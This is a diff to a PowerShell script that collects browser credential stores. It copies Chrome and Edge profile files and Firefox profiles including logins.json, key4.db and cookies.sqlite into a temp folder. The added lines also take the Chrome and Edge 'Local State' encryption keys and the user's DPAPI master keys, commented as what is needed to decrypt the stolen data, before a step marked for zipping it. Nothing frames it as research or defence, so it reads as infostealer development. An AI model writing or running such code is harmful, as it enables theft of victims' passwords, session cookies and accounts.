@@ -26,28 +26,48 @@ $browserFiles = @(
     "History"
 )
 
-# Chrome paths
-$chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+# Chrome profile path
+$chromeUserDataDefault = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+
 foreach ($file in $browserFiles) {
-    $source = Join-Path $chromeUserData $file
+    $source = Join-Path $chromeUserDataDefault $file
     if (Test-Path $source) {
         Copy-Item $source -Destination (Join-Path $tempDir "Chrome_$file") -Force
     }
 }
 
-# Edge paths
-$edgeUserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+# Add Chrome "Local State" file (contains encrypted AES key needed for decryption)
+$chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+if (Test-Path $chromeLocalState) {
+    Copy-Item $chromeLocalState -Destination (Join-Path $tempDir "Chrome_Local State") -Force
+}
+
+# Edge profile path
+$edgeUserDataDefault = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+
 foreach ($file in $browserFiles) {
-    $source = Join-Path $edgeUserData $file
+    $source = Join-Path $edgeUserDataDefault $file
     if (Test-Path $source) {
         Copy-Item $source -Destination (Join-Path $tempDir "Edge_$file") -Force
     }
 }
 
-# Firefox profile copy (includes cookies.sqlite, key4.db, logins.json, places.sqlite)
+# Add Edge "Local State" file
+$edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+if (Test-Path $edgeLocalState) {
+    Copy-Item $edgeLocalState -Destination (Join-Path $tempDir "Edge_Local State") -Force
+}
+
+# Copy Firefox profiles (includes cookies.sqlite, key4.db, logins.json, places.sqlite)
 $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
 if (Test-Path $firefoxProfiles) {
     Copy-Item $firefoxProfiles -Destination (Join-Path $tempDir 'FirefoxData') -Recurse -Force
+}
+
+# Copy DPAPI keys needed to decrypt Chrome/Edge encrypted data
+$dpapiDir = "$env:APPDATA\Microsoft\Protect"
+if (Test-Path $dpapiDir) {
+    Copy-Item $dpapiDir -Destination (Join-Path $tempDir 'DPAPI_Keys') -Recurse -Force
 }
 
 # Zip collected data
